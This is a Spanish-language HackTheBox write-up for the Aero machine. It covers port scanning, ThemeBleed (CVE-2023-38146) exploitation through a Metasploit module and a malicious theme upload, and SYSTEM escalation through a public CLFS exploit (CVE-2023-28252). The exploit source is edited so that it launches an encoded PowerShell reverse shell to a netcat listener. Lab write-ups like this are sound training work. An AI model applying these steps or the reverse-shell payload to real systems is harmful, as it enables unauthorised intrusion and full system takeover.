---
title: Writeup Aero
date: 2024-04-05 02:12:10 +/-TTTT
categories: [HTB]
tags: [windows, hackthebox, metasploit, medio]     # TAG names should always be lowercase

image:
  path: /assets/img/Posts/Aero/post_img.JPG
  alt: Writeup aero
---

# Writeup de Aero

Esta vez traigo una writeup de la maquina de HTB Aero, el cual creo que es interesante porque se hara uso de metasploit para obtener la sesion de usuario y en otros writeups he visto que se usa CobaltStrike o Directamente el POC del creador del exploit que permite obtener la sesion, pero en ninguno se ha hecho uso de metasploit.


### Enumeracion

Una vez conectados al laboratorio de HTB y si hemos iniciado la maquina correctamente podemos comprobar que esta esta activa mediante una traza ICMP:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/trazaICMP.JPG" alt="Grafica del estudio de mercado" >
</div>


Tal como se puede apreciar la maquina devuelve el paquete con un ttl de 127 debido a que es una maquina windows.

Podemos enumerar la maquina con el siguiente comando en NMAP

```bash
sudo nmap -sS --min-rate 5000 -n -Pn -vvv --open -p- -oG allPorts 10.10.11.237
```
Usare la siguiente utilidad incluida en mi .bashrc para extraer los puertos del archivo allPorts:

```bash
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}
```
La salida se ve a continuacion:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/extractPorts.JPG" alt="Grafica del estudio de mercado" >
</div>


Por lo que se ve hay un unico servicio a la escucha el cual es la pagina http que se muestra a continuacion:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/website.JPG" alt="Grafica del estudio de mercado" >
</div>


### Explotacion
Inmediatamente llaman la atencion las siguiente palabras: AERO y windows 11. Ademas tenemos el siguiente panel donde podemos subir temas de windows para que sean almacenados:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/panelDeTemas.JPG" alt="Grafica del estudio de mercado" >
</div>

Buscando en google: "Aero windows 11 theme vulnerability" encontramos que existen 2 vulnerabilidades conocidas, tal como se muestra en la siguiete imagen:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/busqueda1.JPG" alt="Grafica del estudio de mercado" >
</div>


Se ve que la que se podria usar es la vulnerabilidad de ejecucion de codigo remoto CVE-2023-38146 con una severidad de 8.8. Esta vulnerabilidad tambien se conoce como themeBleed. El descubridor de esta vulnerabilidad escribio el siguiente [POC](https://github.com/Jnnshschl/CVE-2023-38146), hay un par de writeups en linea para aprender como usar este POC.

Nostros ocuparemos Metasploit pues si surgen problemas al intentar usar el exploit directo, es una buena alternativa. Dado que es una vulnerabilidad relativamente nueva lo primero que haremos sera actualizar metasploit a la version mas reciente con el siguiente comando.

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
```
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/msfupdate.JPG" alt="Grafica del estudio de mercado" >
</div>


Ahora podemos verificar la version de metasploit con el siguiente comando:

```bash
msfconsole -v
```

Una vez actualizado iniciamos metasploit como root: 
```bash
sudo msfconsole
```
Y le decimos que vamos a usar el siguiente exploit:

```bash
msf > use exploit/windows/fileformat/theme_dll_hijack_cve_2023_38146
```

Las opciones que debemos configurar para usar el exploit son las siguientes: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/exploit1opts.JPG" alt="Grafica del estudio de mercado" >
</div>


* <span style="background-color: #D9D9D9;color: black">SRVHOST</span> : es la ip 0.0.0.0 que indica que nuesta maquina atacante estara a la escucha en todas las interfaces. Y se usara para iniciar el servidor smb.

* <span style="background-color: #D9D9D9;color: black">SRVPORT</span> : es el puerto que se usara para recibir las conexiones smb por defecto 445.

* <span style="background-color: #D9D9D9;color: black">STYLE_FILE</span> : aqui va la ruta a un archivo .msstyles firmado por microsoft necesario para enganar al equipo victima. Si tenemos un computador windows tendremos un archivo que sirve para estos propositos en la ruta **C:\Windows\Resources\Themes\aero\aero.msstyles** podemos copiarlo desde el windows a nuestro linux.

* <span style="background-color: #D9D9D9;color: black">STYLE_FILE_NAME</span> : aqui tiene que ir el mismo nombre de arriba pero sin la extension.

* <span style="background-color: #D9D9D9;color: black">THEME_FILE_NAME</span> : este es el archivo que debemos convence a la victima que instale, en este caso lo subiremos en el panel que la web ofrece, podemos colocarle cualquier nombre siempre que tenga la extension .theme . 

* <span style="background-color: #D9D9D9;color: black">LHOST</span> : la ip de nuestro equipo atacante en la red de hackthebox. 

* <span style="background-color: #D9D9D9;color: black">LPORT</span> : un puerto libre en nuestra maquina atacante para escuchar la shell inversa.

Ademas ponemos `set verbose true` en la consola de metasploit para indicarle que queremos ver toda la salida que el programa genera.

La configuracion final de nuestro exploit deberia ser: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/exploit1optsready.JPG" alt="Grafica del estudio de mercado" >
</div>


Ahora podemos correr el exploit iniciando el serivdor smb y dejando activo el listener de la shell inversa, como se muestra a continuacion: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/exploit.JPG" alt="Grafica del estudio de mercado" >
</div>


Subimos el tema que esta en la ruta **/root/.msf4/local/malicioso.theme** a la web de aero.
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/subida.JPG" alt="Grafica del estudio de mercado" >
</div>


Una vez que le damos al boton de UPLOAD FILE deberiamos ver lo siguiente en nuestro metasploit:
<div style="text-align:center">
    <img src="[/assets/img/Posts/Aero/meterpreterestablished.JPG" alt="Grafica del estudio de mercado" >
</div>


accedemos a la sesion correspondiente de meterpreter: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/sessions.JPG" alt="Grafica del estudio de mercado" >
</div>


La flag de usuarios como es costumbre se encuentra en el escritorio de SAM.EMERSON:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/userflag.JPG" alt="Grafica del estudio de mercado" >
</div>


### Escalada de Privilegios

Como podemos ver en el directorio `C:\Users\sam.emerson\Documents` hay un archivo que tiene el nombre de una vulnerabilidad de escalada de privilegios, lo descargamos mediante meterpreter como se muestra en la siguiente imagen:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/filedownload.JPG" alt="Grafica del estudio de mercado" >
</div>


Y si lo abrimos veremos que el archivo contiene el siguiente texto:

```pdf
CVE-2023-28252 Summary:
Vulnerability Type: Privilege Escalation
Target Component: Common Log File System (CLFS)
Risk Level: Critical
Exploitation Date: February 2022 onwards
Patch Released by Microsoft: April 2023
Background:
The Nokoyawa ransomware group has been actively exploiting this vulnerability since
February 2022, and it was only in April 2023 that Microsoft released a patch to
address this issue. This vulnerability has been used as a means for attackers to
gain unauthorized access to Windows systems, making it imperative for us to apply
the necessary patch to safeguard our infrastructure.
Actions Required:
Immediate Patching: We strongly recommend applying the security patch released by
Microsoft for CVE-2023-28252 as soon as possible to mitigate the risk associated
with this vulnerability. Failing to do so could leave our servers exposed to
potential exploitation.
Review and Monitoring: In addition to patching, we should conduct a thorough review
of our server logs to check for any signs of suspicious activity or unauthorized
access. Continuous monitoring of our server environment is crucial to ensure the
security of our systems.
Security Awareness: It is essential to remind all team members of the importance of
practicing good cybersecurity hygiene. Encourage the use of strong, unique
passwords and two-factor authentication wherever applicable.
Incident Response Plan: Ensure that our incident response plan is up-to-date and
ready for immediate activation in case of any security incidents. Timely detection
and response are critical in mitigating the impact of potential attacks.
```

Una busqueda de la vulnerabilidad en google nos lleva al siguiente repositorio que tiene un [POC](https://github.com/fortra/CVE-2023-28252). Lo clonamos y lo abrimos con vstudio. Y en archivo clfs_eop.cpp cambiamos la parte que ejecuta notepad con privilegios de sistema para que ejecuta una reverse shell de powershell. El codigo en cuestion es el siguiente: 

```c++
if (strcmp(username, "SYSTEM") == 0){
	printf("WE ARE SYSTEM\n");
	system("notepad.exe");			
}else {
	printf("NOT SYSTEM\n");
}
exit(1);
return;
```

Vamos a la pagina [revshells](https://www.revshells.com/) y creamos la siguiente shell: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/revshell.JPG" alt="Grafica del estudio de mercado" >
</div>


Y el codigo del POC nos quedaria de la siguiente manera:

```c++
if (strcmp(username, "SYSTEM") == 0){
	printf("WE ARE SYSTEM\n");
	system("powershell -e JABj...=");			
}else {
	printf("NOT SYSTEM\n");
}
exit(1);
return;
```
En mi caso como estoy usando vstudio 2022 y el proyecto esta hecho en vstudio 2019 debo hacer click derecho en el icono de solucion y luego click en `retarget solution` y se me deberia abrir el siguiente cuadro de texto:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/retarget.JPG" alt="Grafica del estudio de mercado" >
</div>



Hago click en Ok. Luego selecciono Release > x64 > Build solution. Luego movemos el archivo .exe generado a nuestra maquina de atacante y lo pasamos a la maquina victima. En este caso lo hare con el meterpreter como se muestra a continuacion: 

<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/upload.JPG" alt="Grafica del estudio de mercado" >
</div>


Inicio netcat en mi maquina atacante: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/ncstart.JPG" alt="Grafica del estudio de mercado" >
</div>


y ejecuto el programa desde la shell de windows que abri en el meterpreter:
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/fortraexploit.JPG" alt="Grafica del estudio de mercado" >
</div>

Ahora deberia ver que en el netcat se abre una shell y podre extraer la flag que se encuentra en `C:\Users\Administrator\Desktop\root.txt`: 
<div style="text-align:center">
    <img src="/assets/img/Posts/Aero/root_flag.JPG" alt="Grafica del estudio de mercado" >
</div>


## Conclusion

Es una maquina bastante realista que permite aprender sobre exploits reales y que en el caso del segundo tuvo un impacto en la propagacion de ransomware Nokoyawa. Ademas aprendimos sobre como se usa Microsoft Security Update Guide.